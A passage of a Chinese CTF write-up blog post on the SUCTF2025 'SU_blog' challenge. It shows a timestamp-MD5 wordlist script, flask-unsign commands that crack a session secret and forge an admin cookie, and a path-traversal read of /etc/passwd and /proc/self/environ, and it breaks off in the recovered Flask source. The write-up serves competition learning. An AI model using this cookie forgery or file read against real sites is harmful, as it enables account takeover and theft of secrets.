<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="出了一道中等难度的题目最后二十多解"><title>SUCTF2025</title><link rel=canonical href=https://baozongwi.xyz/p/suctf2025/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="SUCTF2025"><meta property='og:description' content="出了一道中等难度的题目最后二十多解"><meta property='og:url' content='https://baozongwi.xyz/p/suctf2025/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='flask'><meta property='article:tag' content='php'><meta property='article:tag' content='出题'><meta property='article:tag' content='jdbc'><meta property='article:published_time' content='2025-01-13T16:41:17+00:00'><meta property='article:modified_time' content='2025-01-13T16:41:17+00:00'><meta name=twitter:title content="SUCTF2025"><meta name=twitter:description content="出了一道中等难度的题目最后二十多解"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
<span>travel</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#su_blog>SU_blog</a><ol><li><a href=#预期>预期</a></li><li><a href=#小点子>小点子</a></li></ol></li><li><a href=#su_photogallery>SU_photogallery</a></li><li><a href=#su_pop>SU_POP</a></li><li><a href=#su_sujava>SU_sujava</a></li><li><a href=#su_easyk8s_on_aliyunreally-very-easy>SU_easyk8s_on_aliyun(REALLY VERY EASY)</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/suctf2025/>SUCTF2025</a></h2><h3 class=article-subtitle>出了一道中等难度的题目最后二十多解</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jan 13, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>17 minute read</time></div></footer></div></header><section class=article-content><h1 id=0x01-说在前面>0x01 说在前面</h1><p>这次是联合战队SU主办，我也当了两天的播报员，同时作为哥哥们与参赛师傅进行答疑的桥梁，说实话不敢想，甚至还出了一道非常简单的题目，之前根本不敢想这种</p><h1 id=0x02-question>0x02 question</h1><h2 id=su_blog>SU_blog</h2><h3 id=预期>预期</h3><p>首先进来是一个普通的博客网站，非常之简陋，而这里注册一个账号，进入网站之后发现页尾有提示</p><p><img src=/p/suctf2025/image-20250113152253719.png width=1600 height=114 srcset="/p/suctf2025/image-20250113152253719_hu_1e2973932671bb41.png 480w, /p/suctf2025/image-20250113152253719_hu_994a46e63237729d.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=1403 data-flex-basis=3368px></p><p>这个东西有什么用处呢，F12看看什么情况</p><p><img src=/p/suctf2025/image-20250113152318333.png width=1360 height=507 srcset="/p/suctf2025/image-20250113152318333_hu_c53e971b979a8dd7.png 480w, /p/suctf2025/image-20250113152318333_hu_88acbbfd0f8e29ef.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=268 data-flex-basis=643px></p><p>存在session，可能就是进行flask的session伪造了，写个简单的脚本，中途有师傅来问我时间戳是怎么样的，其实呢，我反正都也说明白的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 获取整数时间戳</span>
</span></span><span class=line><span class=cl><span class=n>timestamp</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>start</span> <span class=o>=</span> <span class=n>timestamp</span> <span class=o>-</span> <span class=mi>300000</span>
</span></span><span class=line><span class=cl><span class=n>end</span> <span class=o>=</span> <span class=n>timestamp</span> <span class=o>+</span> <span class=mi>300000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 生成整数范围并计算其 MD5 哈希值</span>
</span></span><span class=line><span class=cl><span class=n>my_dict</span> <span class=o>=</span> <span class=p>{</span><span class=n>i</span><span class=p>:</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>start</span><span class=p>,</span> <span class=n>end</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 将 MD5 哈希值写入文件</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./output.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span><span class=p>,</span> <span class=n>md5_hash</span> <span class=ow>in</span> <span class=n>my_dict</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>md5_hash</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;MD5 哈希值已成功写入文件 output.txt&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>然后使用<code>flask-unsign</code>来进行爆破密钥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flask-unsign --unsign --cookie &#34;eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSJ9.Z20ytA.1XlW1ub_pD2C01b9TRSrpAeX7Ps&#34; --wordlist C:\Users\baozhongqi\Desktop\output.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flask-unsign --sign --cookie &#34;{&#39;username&#39;: &#39;admin&#39;}&#34; --secret &#39;3d878169e90d61b3429d932e168282f7&#39;
</span></span></code></pre></td></tr></table></div></div><p>然后换上就发现多了一个友链添加的功能，这里看着像是有ssrf漏洞，但是测试了很久也没有任何东西，而且也没有探测到有常见端口在，看友链也是直接一个重定向，在文章处测试了很久发现原来有任意文件读取</p><p><img src=/p/suctf2025/image-20250113153248547.png width=1000 height=727 srcset="/p/suctf2025/image-20250113153248547_hu_1a2822a6742a18e8.png 480w, /p/suctf2025/image-20250113153248547_hu_a1b31e8de3231823.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=137 data-flex-basis=330px></p><p>那先读取<code>/etc/passwd</code></p><p><img src=/p/suctf2025/image-20250113153425355.png width=1180 height=765 srcset="/p/suctf2025/image-20250113153425355_hu_c697e34f8b88b9b2.png 480w, /p/suctf2025/image-20250113153425355_hu_f52f1e2000541c54.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=154 data-flex-basis=370px></p><p>但是好像没成功理论上这个payload是对的</p><p><img src=/p/suctf2025/image-20250113153535228.png width=1824 height=613 srcset="/p/suctf2025/image-20250113153535228_hu_c12015534ac3749c.png 480w, /p/suctf2025/image-20250113153535228_hu_ea51ac985e03f2d1.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=297 data-flex-basis=714px></p><p>双写绕过即可，那么我们读取重要变量</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/proc/self/environ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/proc/self/cmdline
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/app/app.py
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/suctf2025/image-20250113153644509.png width=1798 height=627 srcset="/p/suctf2025/image-20250113153644509_hu_792b980d14718001.png 480w, /p/suctf2025/image-20250113153644509_hu_c84044bf5c936077.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=286 data-flex-basis=688px></p><p><img src=/p/suctf2025/image-20250113153704972.png width=1368 height=635 srcset="/p/suctf2025/image-20250113153704972_hu_52418de2d52f178f.png 480w, /p/suctf2025/image-20250113153704972_hu_5634fad8269f72ca.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=215 data-flex-basis=517px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=err>!</span><span class=p>[</span><span class=n>image</span><span class=o>-</span><span class=mi>20250113153704972</span><span class=p>](</span><span class=n>image</span><span class=o>-</span><span class=mf>20250113153704972.</span><span class=n>png</span><span class=p>)</span><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span><span class=o>,</span><span class=nn>os</span><span class=o>,</span><span class=nn>json</span><span class=o>,</span><span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pydash</span> <span class=kn>import</span> <span class=n>set_</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>waf</span> <span class=kn>import</span> <span class=n>pwaf</span><span class=p>,</span><span class=n>cwaf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SECRET_KEY&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>users</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;testuser&#34;</span><span class=p>:</span> <span class=s2>&#34;password&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>BASE_DIR</span> <span class=o>=</span> <span class=s1>&#39;/var/www/html/myblog/app&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>articles</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mi>1</span><span class=p>:</span> <span class=s2>&#34;articles/article1.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>2</span><span class=p>:</span> <span class=s2>&#34;articles/article2.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>3</span><span class=p>:</span> <span class=s2>&#34;articles/article3.txt&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>friend_links</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;bkf1sh&#34;</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;https://ctf.org.cn/&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;fushuling&#34;</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;https://fushuling.com/&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;yulate&#34;</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;https://www.yulate.com/&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;zimablue&#34;</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;https://www.zimablue.life/&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;baozongwi&#34;</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;https://baozongwi.xyz/&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>User</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user_data</span> <span class=o>=</span> <span class=n>User</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;blog.html&#39;</span><span class=p>,</span> <span class=n>articles</span><span class=o>=</span><span class=n>articles</span><span class=p>,</span> <span class=n>friend_links</span><span class=o>=</span><span class=n>friend_links</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>username</span> <span class=ow>in</span> <span class=n>users</span> <span class=ow>and</span> <span class=n>users</span><span class=p>[</span><span class=n>username</span><span class=p>]</span> <span class=o>==</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>username</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;Invalid credentials&#34;</span><span class=p>,</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
